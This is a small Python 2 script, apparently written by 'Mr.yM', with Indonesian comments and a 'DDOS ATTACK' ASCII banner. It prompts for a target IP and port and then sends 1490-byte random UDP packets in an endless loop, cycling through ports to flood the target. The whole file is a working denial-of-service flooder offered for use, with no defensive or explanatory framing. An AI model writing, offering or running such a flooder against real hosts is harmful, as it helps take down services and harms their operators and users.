#TooLs Created by Mr.yM
#Udah tau gk guna, masih dibuat
#Dasar Aqu :')

import os
import sys
import socket
import random

#SET SOCK AND RANDOM
##########################################################
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) ##
bytes = random._urandom(1490)                           ##
##########################################################

os.system("clear")
print
print "     ______          ______            _______  _______              "
print "    (  __  \  _____ (  __  \  _____   (  ___  )(  ____ \             "
print "    | (  \  )( ____|| (  \  )| ____|  | (   ) || (    \/             "
print "    | |   ) || |    | |   ) || |      | |   | || (_____              "
print "    | |   | || ====|| |   | || ====|  | |   | |(_____  ) ATTACK      "
print "    | |   ) || |___ | |   ) || |___   | |   | |      ) |             "
print "    | (__/  )(_____|| (__/  )|_____|  | (___) |/\____) |             "
print "    (______/        (______/          (_______)\_______)             "
print
print "                 >//< Author Mr.yM >//<                              "
print
ip = raw_input("IP Target : ")
port = input("Port       : ")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s sampe down port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
